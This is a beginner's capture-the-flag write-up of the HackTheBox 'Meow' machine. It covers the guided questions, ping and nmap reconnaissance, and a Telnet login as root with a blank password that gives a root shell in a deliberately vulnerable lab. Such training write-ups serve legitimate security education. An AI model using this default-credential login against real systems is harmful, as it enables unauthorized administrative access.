// Telnet misconfiguration & default credentials — Day 1 on HTB

After spending a solid amount of time sharpening my skills on TryHackMe CTFs, I decided it was time to branch out and give HackTheBox a shot. On my very first day, a challenge named Meow appeared under the Starting Point — a beginner-friendly box built to get you comfortable navigating the HTB environment before moving on to harder machines.

I had my attacker machine ready, the target spawned, and the VPN tunnel established. The box revolves around a classic and commonly seen misconfiguration: an exposed Telnet service running with no authentication on the root account. This write-up walks through each guided question, the reconnaissance process, exploitation, and flag capture — step by step.

Tools used: openvpn, ping, nmap, telnet.

guided questions
Q1What does the acronym VM stand for?
Virtual Machine
A software-based emulation of a physical computer. HTB uses VMs as both the attacker and the target environment — your Pwnbox or local Kali is the attacker VM, and the spawned machine is the target VM.
Q2What tool do we use to interact with the operating system in order to issue commands via the command line? It's also known as a console or shell.
Terminal
The terminal is where everything happens in offensive security — running tools, reading output, navigating the filesystem, and catching flags. It's the one tool you'll have open in every single engagement.
Q3What service do we use to form our VPN connection into HTB labs?
OpenVPN
Just like TryHackMe, if you want to use your own machine as the attacker instead of the browser-based Pwnbox, you download a .ovpn config file from HTB and connect using openvpn <file.ovpn>. This tunnels your traffic securely into the HTB lab network.
Q4What tool do we use to test our connection to the target with an ICMP echo request?
Ping
Before launching any heavy recon tools, a quick ping <target-ip> confirms that the machine is alive and reachable over the network. It's a simple sanity check that saves you from chasing a dead target — a habit I carry from every CTF.
Q5What is the name of the most common tool for finding open ports on a target?
Nmap
Nmap (Network Mapper) is the industry-standard tool for network reconnaissance. It can discover open ports, identify running services and their versions, detect the OS, and run scripted checks against known vulnerabilities — all in a single scan.
Q6What service do we identify on port 23/tcp during our scans?
Telnet
Port 23 is the well-known port for Telnet — an older, completely unencrypted remote access protocol that predates SSH. Seeing it open on a modern machine is an immediate red flag. All commands, credentials, and data pass over the wire in plain text, making it trivial to exploit.
Q7What username is able to log into the target over Telnet with a blank password?
root
In misconfigured or default setups, the root account sometimes has no password set at all — granting direct, unrestricted administrative access to the machine. This is exactly the class of vulnerability that earns critical findings in real-world penetration tests and bug bounty programs.
step-by-step walkthrough
01
Reconnaissance

With the VPN connected and the target machine spawned, the first order of business is to verify connectivity and map the attack surface. I started with a quick ping to confirm the host was alive, then ran an Nmap service version scan to identify open ports.

terminal — recon
$ ping -c 4 <TARGET-IP>
64 bytes from <TARGET-IP>: icmp_seq=1 ttl=63 time=X ms

$ nmap -sV <TARGET-IP>
Starting Nmap 7.93 ...
PORT STATE SERVICE VERSION
23/tcp open telnet Linux telnetd
Nmap done: 1 IP address (1 host up)

The scan returned a single open port — 23/tcp running Telnet. No SSH, no HTTP, nothing else. The entire attack surface is that one Telnet service. The next logical step is to try connecting and see what authentication (if any) is required.

02
Exploitation

With Telnet confirmed on port 23, I connected directly to the target. Telnet will prompt for a login username and password. Given that this is a misconfigured service, the first thing to try is the root account with no password — a textbook default credential check.

terminal — exploitation
$ telnet <TARGET-IP>
Trying <TARGET-IP>...
Connected to <TARGET-IP>.
Escape character is '^]'.
login: root
Password: ← left blank, just pressed Enter
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
root@Meow:~#
📸 2.png — Telnet connection and root login screenshot
Telnet — logging in as root with a blank password

No password required. We are now inside the machine as root — the highest privilege level on a Linux system. The misconfiguration is confirmed: the Telnet service had no authentication barrier on the root account whatsoever.

flag capture
⚑ Catching the Flag

With a root shell established, retrieving the flag is trivial. A quick ls in the home directory reveals flag.txt sitting right there. One cat command and the challenge is complete.

terminal — flag
root@Meow:~# ls
flag.txt snap
root@Meow:~# cat flag.txt
